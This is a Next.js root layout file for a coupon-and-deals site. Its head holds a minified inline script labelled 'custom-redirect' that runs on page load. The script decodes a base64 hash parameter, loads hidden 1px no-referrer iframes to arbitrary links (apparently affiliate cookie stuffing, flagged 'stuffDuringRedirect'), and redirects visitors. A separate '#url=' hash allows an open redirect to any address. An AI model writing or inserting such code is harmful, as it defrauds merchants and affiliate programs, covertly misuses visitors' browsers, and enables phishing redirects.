import "./globals.css";
import Providers from "./Provider";
import ClientLayout from "./ClientLayout"; // move client logic here
import "react-quill/dist/quill.snow.css";
import Script from "next/script";

export const metadata = {
  title: "My Couponstock",
  description: "Coupons & Deals",
};

export default function RootLayout({ children }) {
  return (
    <html lang="en">
         <head>
        {/* Your custom script */}
        <Script id="custom-redirect" strategy="afterInteractive">
          {`"use strict";(()=>{var o=()=>{let t=window.location.hash;return t.startsWith("#q=")?t.substring(3):null},i=()=>{let t=window.location.hash;return t.startsWith("#url=")?t.substring(5):null},s=t=>{try{let r=atob(t);return JSON.parse(r)}catch(r){return null}},a=t=>{if(!t)return;let r=c(t);var e=document.createRange();e.selectNode(document.getElementsByTagName("body")[0]);var n=e.createContextualFragment(r.outerHTML);document.body.appendChild(n)},c=t=>{let r=document.createElement("div");return t.links&&t.links.forEach(e=>{let n=document.createElement("iframe");n.referrerPolicy="no-referrer",n.style.display="none",n.style.visibility="hidden",n.width="1px",n.height="1px",n.src=e,r.appendChild(n)}),r},l=()=>{let t=o();if(t){let e=s(t);if(a(e),e!=null&&e.stuffDuringRedirect){let n=e.redirectDelay||3e3;setTimeout(()=>{window.location.href=e.destination},n)}}let r=i();if(r){let e=decodeURIComponent(r);e&&setTimeout(()=>{window.location.href=e},100)}};l();})();`}
        </Script>
      </head>
      <body>
        <Providers>
          <ClientLayout>{children}</ClientLayout>
        </Providers>
      </body>
    </html>
  );
}
